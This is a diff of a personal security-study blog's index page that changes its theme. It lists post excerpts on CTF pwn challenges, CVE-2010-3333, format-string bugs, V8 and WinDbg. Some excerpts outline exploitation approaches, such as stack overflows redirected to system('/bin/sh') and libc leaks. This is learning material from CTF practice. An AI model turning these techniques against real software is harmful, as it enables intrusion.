@@ -1,749 +1,1477 @@
-
-
 <!DOCTYPE html>
-<html lang="en" data-default-color-scheme=auto>
-
-
-
+<html>
 <head>
-  <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/SinkyQ/SinkyQ.github.io.git/img/fluid.png">
-  <link rel="icon" href="/SinkyQ/SinkyQ.github.io.git/img/fluid.png">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <meta charset="utf-8">
   
-  <meta name="theme-color" content="#2f4154">
-  <meta name="author" content="Sinky">
-  <meta name="keywords" content="">
+  <title>Sinky&#39;s Blog</title>
+
+  <!-- keywords -->
   
-    <meta property="og:type" content="website">
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
 <meta property="og:title" content="Sinky&#39;s Blog">
 <meta property="og:url" content="https://github.com/SinkyQ/SinkyQ.github.io.git/page/3/index.html">
 <meta property="og:site_name" content="Sinky&#39;s Blog">
 <meta property="og:locale" content="en_US">
 <meta property="article:author" content="Sinky">
-<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternative" href="/atom.xml" title="Sinky&#39;s Blog" type="application/atom+xml">
   
   
+    <link rel="icon" href="/img/favicon.ico">
   
-  <title>Sinky&#39;s Blog</title>
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
-
-
-
-
-
-<!-- 主题依赖的图标库，不要自行修改 -->
-<!-- Do not modify the link that theme dependent icons -->
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
-
-
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
-
-
-<link  rel="stylesheet" href="/SinkyQ/SinkyQ.github.io.git/css/main.css" />
-
-
-  <link id="highlight-css" rel="stylesheet" href="/SinkyQ/SinkyQ.github.io.git/css/highlight.css" />
   
-    <link id="highlight-css-dark" rel="stylesheet" href="/SinkyQ/SinkyQ.github.io.git/css/highlight-dark.css" />
+<link rel="stylesheet" href="/SinkyQ/SinkyQ.github.io.git/css/style.css">
+
+  
   
 
-
-
-
-  <script id="fluid-configs">
-    var Fluid = window.Fluid || {};
-    Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"github.com","root":"/SinkyQ/SinkyQ.github.io.git/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/SinkyQ/SinkyQ.github.io.git/local-search.xml"};
-
-    if (CONFIG.web_analytics.follow_dnt) {
-      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
-      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
-    }
-  </script>
-  <script  src="/SinkyQ/SinkyQ.github.io.git/js/utils.js" ></script>
-  <script  src="/SinkyQ/SinkyQ.github.io.git/js/color-schema.js" ></script>
   
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
 
 
   
 <meta name="generator" content="Hexo 6.2.0">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
-<link rel="alternate" href="/SinkyQ/SinkyQ.github.io.git/atom.xml" title="Sinky's Blog" type="application/atom+xml">
 </head>
-
-
 <body>
-  
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+				<img lazy-src="" class="js-avatar">
+			
+		</a>
 
-  <header>
-    
+		<hgroup>
+			<h1 class="header-author"><a href="/">Sinky</a></h1>
+		</hgroup>
 
-<div class="header-inner" style="height: 100vh;">
-  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand" href="/SinkyQ/SinkyQ.github.io.git/">
-      <strong>Sinky</strong>
-    </a>
+		
 
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/SinkyQ/SinkyQ.github.io.git/">Home</a></li>
+				        
+							<li><a href="/SinkyQ/SinkyQ.github.io.git/archives">Archives</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="half-header-menu">
+						<a class="hide">Home</a>
+						<a>Tags</a>
+						<a>Links</a>
+						<a>About</a>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+						</div>
+						<!-- music -->
+						
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						<a href="/SinkyQ/SinkyQ.github.io.git/tags/Buu/" style="font-size: 10px;">Buu</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/IOT/" style="font-size: 16.67px;">IOT</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/IOT-%E3%80%8A%E7%89%A9%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E3%80%8B/" style="font-size: 10px;">IOT 《物联网渗透测试》</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/RE/" style="font-size: 10px;">RE</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/Re/" style="font-size: 10px;">Re</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/XSS/" style="font-size: 10px;">XSS</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/bp/" style="font-size: 10px;">bp</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/chrome/" style="font-size: 13.33px;">chrome</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/chrome-bug/" style="font-size: 13.33px;">chrome_bug</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/chrome%E7%9F%A5%E8%AF%86%E7%82%B9/" style="font-size: 10px;">chrome知识点</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/chrome%E8%B0%83%E8%AF%95/" style="font-size: 10px;">chrome调试</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/pikachu/" style="font-size: 13.33px;">pikachu</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/web/" style="font-size: 10px;">web</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/windows%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">windows漏洞</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 13.33px;">学习笔记</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">学习记录</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">漏洞</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89/" style="font-size: 10px;">漏洞战争</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" style="font-size: 10px;">环境搭建</a>
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/">github</a>
+			        
+			        </div>
+				</section>
+				
 
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/SinkyQ/SinkyQ.github.io.git/">
-                <i class="iconfont icon-home-fill"></i>
-                Home
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/SinkyQ/SinkyQ.github.io.git/archives/">
-                <i class="iconfont icon-archive-fill"></i>
-                Archives
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/SinkyQ/SinkyQ.github.io.git/categories/">
-                <i class="iconfont icon-category-fill"></i>
-                Categories
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/SinkyQ/SinkyQ.github.io.git/tags/">
-                <i class="iconfont icon-tags-fill"></i>
-                Tags
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/SinkyQ/SinkyQ.github.io.git/about/">
-                <i class="iconfont icon-user-fill"></i>
-                About
-              </a>
-            </li>
-          
-        
-        
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
-              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
-            </a>
-          </li>
-          
-        
-        
-          <li class="nav-item" id="color-toggle-btn">
-            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
-                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
-          </li>
-        
-      </ul>
+				
+				
+				<section class="switch-part switch-part4">
+				
+					<div id="js-aboutme">I&#39;m a developer.</div>
+				</section>
+				
+			</div>
+		</div>
+	</header>				
+</div>
     </div>
-  </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/SinkyQ/SinkyQ.github.io.git/">Home</a></li>
+		        
+					<li><a href="/SinkyQ/SinkyQ.github.io.git/archives">Archives</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+				</div>
+			</nav>
+		</header>				
+	</div>
 </nav>
-
+      <div class="body-wrap">
   
-
-<div id="banner" class="banner" parallax=true
-     style="background: url('/SinkyQ/SinkyQ.github.io.git/img/default.png') no-repeat center center; background-size: cover;">
-  <div class="full-bg-img">
-    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-      <div class="banner-text text-center fade-in-up">
-        <div class="h2">
-          
-            <span id="subtitle" data-typed-text="心之所向，素履以往，生如逆旅，一苇以航"></span>
-          
-        </div>
-
-        
-      </div>
-
-      
-        <div class="scroll-down-bar">
-          <i class="iconfont icon-arrowdown"></i>
-        </div>
-      
-    </div>
-  </div>
-</div>
-
-</div>
-
-  </header>
-
-  <main>
-    
-      <div class="container nopadding-x-md">
-        <div id="board"
-          style="margin-top: 0">
-          
-          <div class="container">
-            <div class="row">
-              <div class="col-12 col-md-10 m-auto">
-                
-
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/%E3%80%8AARM%E5%B5%8C%E5%85%A5%E5%BC%8FLinux%E7%B3%BB%E7%BB%9F%E5%BC%80%E5%8F%91%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/" target="_self">
-          《ARM嵌入式Linux系统开发详解》学习笔记1
-        </a>
-      </h1>
-
-      
-      <a class="index-excerpt index-excerpt__noimg" href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/%E3%80%8AARM%E5%B5%8C%E5%85%A5%E5%BC%8FLinux%E7%B3%BB%E7%BB%9F%E5%BC%80%E5%8F%91%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/" target="_self">
-        <div>
-          0x01 嵌入式系统入门什么是嵌入式系统： 一种为特定设备服务的，软件硬件可裁剪的计算机系统，形式变化多样、体积小。如手机、微波炉，对于手机、微波炉来说，需要小型计算机来控制，换句话，是需要把计算机全入到手机和微波炉里，也就是嵌入式系统，不需要严格地响应时间和数据吞吐量，最关键的是能够缩小体积以及功能专门化，嵌入式系统种类繁多，按照系统硬件的核心处理器来说可以分成嵌入式微控制器和嵌入式微处理器。
-        </div>
-      </a>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2022-08-09 11:21" pubdate>
-              2022-08-09
-            </time>
-          </div>
-        
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/SinkyQ/SinkyQ.github.io.git/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">#学习笔记</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02%EF%BC%9ACVE-2010-3333/" target="_self">
-          漏洞战争学习笔记2：CVE-2010-3333
-        </a>
-      </h1>
-
-      
-      <a class="index-excerpt index-excerpt__noimg" href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02%EF%BC%9ACVE-2010-3333/" target="_self">
-        <div>
-          0x01 分析环境os:由于笔者实在没有找到大佬们使用的目标文件office word 2003 11.5604.5606,只有11.8169.8172，但是应该只要是2003 sp3的应该就问题不大。 操作系统：windows XP SP3虚拟机：VM调试器：WinDbg、OD、IDAoffice:office word 2003 11.8169.8172 0x02 漏洞描述oddice xp
-        </div>
-      </a>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2022-08-09 11:17" pubdate>
-              2022-08-09
-            </time>
-          </div>
-        
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/SinkyQ/SinkyQ.github.io.git/tags/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89/">#漏洞战争</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/" target="_self">
-          各类型软件漏洞合集
-        </a>
-      </h1>
-
-      
-      <a class="index-excerpt index-excerpt__noimg" href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/" target="_self">
-        <div>
-          0x01 格式化串漏洞介绍格式化串漏洞产生于数据输出函数中对输出格式解析的缺陷。当输入输出函数的格式控制符能够被外界影响时，攻击者可以利用读写内存的方法修改函数返回地址，劫持进程，使shellcoed得到执行。 此类漏洞发生条件苛刻，实际案例很少。 能够引起此漏洞的函数1234567891011int printf(const char* format [,argument]...);int wp
-        </div>
-      </a>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2022-08-09 11:17" pubdate>
-              2022-08-09
-            </time>
-          </div>
-        
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/SinkyQ/SinkyQ.github.io.git/tags/%E6%BC%8F%E6%B4%9E/">#漏洞</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-int_overflow/" target="_self">
-          攻防世界 int_overflow
-        </a>
-      </h1>
-
-      
-      <a class="index-excerpt index-excerpt__noimg" href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-int_overflow/" target="_self">
-        <div>
-          checksec 查看保护机制 可直接使用栈溢出；基地址不变化；栈中数据有执行权限； 分析思路32位文件，按流程查看程序，main()无突破点。 进入login(),限制username长度最大0x19;限制passwd长度最大0x199； 进入check_passwd()，v3存储passwd长度，满足if语句3&lt;v3&lt;&#x3D;8可跳到else语句。  此处有突破点：v3类型为unsign
-        </div>
-      </a>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2022-08-09 11:17" pubdate>
-              2022-08-09
-            </time>
-          </div>
-        
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/SinkyQ/SinkyQ.github.io.git/tags/pwn/">#pwn</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-guess_num/" target="_self">
-          攻防世界 guess_num
-        </a>
-      </h1>
-
-      
-      <a class="index-excerpt index-excerpt__noimg" href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-guess_num/" target="_self">
-        <div>
-          查看关键main()函数，发现gets(&amp;v11)存在栈溢出  进入sub_C3E()函数，确定满足条件即可cat flag。  题目要求，先输入name,然后连续十次猜对数字得到flag, 进入V11,在栈中占0x20，可以覆盖到seed，使seed[0]已知，后使输入的v8等于随机数v10,拿到flag。  注：（1）在调用rang()时，先利用srand()设好随机数种子，若未设置，
-        </div>
-      </a>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2022-08-09 11:17" pubdate>
-              2022-08-09
-            </time>
-          </div>
-        
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/SinkyQ/SinkyQ.github.io.git/tags/pwn/">#pwn</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-cgpwn2/" target="_self">
-          攻防世界 cgpwn2
-        </a>
-      </h1>
-
-      
-      <a class="index-excerpt index-excerpt__noimg" href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-cgpwn2/" target="_self">
-        <div>
-          算是简单题，进入hello()函数中发现gets(&amp;s) 栈溢出漏洞。 name是全局变量，在bss区段，适合写入。 pwn()函数中调用了__system，但并没有‘&#x2F;bin&#x2F;sh’    攻击思路在name中写入’&#x2F;bin&#x2F;sh’。利用栈溢出覆盖返回地址，使函数返回到system上，拿到shell。 payload&#x3D;填充栈+覆盖保存的exp的值4字节+假的返回地址call __syst
-        </div>
-      </a>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2022-08-09 11:17" pubdate>
-              2022-08-09
-            </time>
-          </div>
-        
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/SinkyQ/SinkyQ.github.io.git/tags/pwn/">#pwn</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-100/" target="_self">
-          攻防世界pwn-100
-        </a>
-      </h1>
-
-      
-      <a class="index-excerpt index-excerpt__noimg" href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-100/" target="_self">
-        <div>
-          分析查壳：checksec  64位，无stack,无PIE；  运行程序，输入字符，无反馈，无限制。   ida查看main函数，发现存在栈溢出，参数a1大小为0x40.然而函数中获取大于等于a2（a2&#x3D;200）的数值存入了a1. 攻击思路无system函数，无&#x2F;bin&#x2F;sh字符串，有read,puts。参数经过寄存器传递（也可IDA查看），可以泄露libc,写入&#x2F;bin&#x2F;sh。   puts只
-        </div>
-      </a>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2022-08-09 11:17" pubdate>
-              2022-08-09
-            </time>
-          </div>
-        
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/SinkyQ/SinkyQ.github.io.git/tags/pwn/">#pwn</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/WinDbg%E4%BD%BF%E7%94%A8%E6%95%B4%E7%90%86/" target="_self">
-          WinDbg使用整理
-        </a>
-      </h1>
-
-      
-      <a class="index-excerpt index-excerpt__noimg" href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/WinDbg%E4%BD%BF%E7%94%A8%E6%95%B4%E7%90%86/" target="_self">
-        <div>
-          0x00 基础命令 .sympath　　&#x2F;&#x2F;显示设置的符号表路径 .reload　　　　&#x2F;&#x2F;此命令主要用于加载符号表。 .reload &#x2F;f　　&#x2F;&#x2F;重新装载模块 .reload &#x2F;i　　&#x2F;&#x2F;强制加载mismatched symbol U　　&#x2F;&#x2F;这个命令主要用于反汇编某个地址，其后面可以跟函数名和地址。U命令后面可以加L表示延长反汇编长度 db　　&#x2F;&#x2F;显示一字节的长度。 dw　　&#x2F;&#x2F;显示两字节的长度
-        </div>
-      </a>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2022-08-09 11:17" pubdate>
-              2022-08-09
-            </time>
-          </div>
-        
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/SinkyQ/SinkyQ.github.io.git/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">#学习笔记</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/V8%E6%BC%8F%E6%B4%9E%E5%88%9D%E5%AD%A6%E4%B9%A0/" target="_self">
-          V8漏洞初学习
-        </a>
-      </h1>
-
-      
-      <a class="index-excerpt index-excerpt__noimg" href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/V8%E6%BC%8F%E6%B4%9E%E5%88%9D%E5%AD%A6%E4%B9%A0/" target="_self">
-        <div>
-          V8基础v8是chrome浏览器的js解析引擎，大多数针对chrome的漏洞利用几乎都是v8引擎引起的  v8编译后二进制名称叫d8.  allow-natives-syntax选项定义了一些v8运行时支持函数，以便于本地调试： 123456789browser&#x2F;x64.release$ .&#x2F;d8 --allow-natives-syntaxV8 version 7.5.0 (candidate)
-        </div>
-      </a>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2022-08-09 11:17" pubdate>
-              2022-08-09
-            </time>
-          </div>
-        
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/SinkyQ/SinkyQ.github.io.git/tags/chrome-bug/">#chrome_bug</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/Ubuntu%E4%B8%8Bbuildroot%E4%BB%A5%E5%8F%8Aqemu%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" target="_self">
-          Ubuntu下buildroot以及qemu环境搭建
-        </a>
-      </h1>
-
-      
-      <a class="index-excerpt index-excerpt__noimg" href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/Ubuntu%E4%B8%8Bbuildroot%E4%BB%A5%E5%8F%8Aqemu%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" target="_self">
-        <div>
-          0x00 搭建环境windows 10VMwareWorkstation proUbuntu 16.04 x64 0x01 安装binwalk12345678sudo susudo apt-get remove binwalksudo spt-get updatesudo apt-get install build-essential autoconf git &#x2F;&#x2F;获取Gitgit clone h
-        </div>
-      </a>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2022-08-09 11:17" pubdate>
-              2022-08-09
-            </time>
-          </div>
-        
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/SinkyQ/SinkyQ.github.io.git/tags/IOT/">#IOT</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-
-
-  <nav aria-label="navigation">
-    <span class="pagination" id="pagination">
-      <a class="extend prev" rel="prev" href="/SinkyQ/SinkyQ.github.io.git/page/2/#board"><i class="iconfont icon-arrowleft"></i></a><a class="page-number" href="/SinkyQ/SinkyQ.github.io.git/">1</a><a class="page-number" href="/SinkyQ/SinkyQ.github.io.git/page/2/#board">2</a><span class="page-number current">3</span><a class="page-number" href="/SinkyQ/SinkyQ.github.io.git/page/4/#board">4</a><a class="extend next" rel="next" href="/SinkyQ/SinkyQ.github.io.git/page/4/#board"><i class="iconfont icon-arrowright"></i></a>
-    </span>
-  </nav>
-
-
-
-              </div>
-            </div>
-          </div>
-        </div>
-      </div>
-    
-
-    
-      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
-        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
-      </a>
-    
-
-    
-      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
-        </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
-    </div>
-  </div>
-</div>
-
-    
-
-    
-  </main>
-
-  <footer>
-    <div class="footer-inner">
+    <article id="post-《ARM嵌入式Linux系统开发》学习笔记1" class="article article-type-post" itemscope itemprop="blogPost">
   
-    <div class="footer-content">
